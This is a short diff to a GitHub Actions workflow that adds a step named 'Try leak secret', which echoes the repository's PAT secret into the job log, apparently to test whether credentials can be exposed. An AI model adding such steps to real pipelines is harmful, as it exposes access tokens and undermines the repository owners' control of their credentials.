@@ -26,6 +26,10 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+    - name: Try leak secret
+      run: |
+        echo "${{ secrets.PAT }}"
+
     - name: Checkout backend
       uses: actions/checkout@v3
       with:
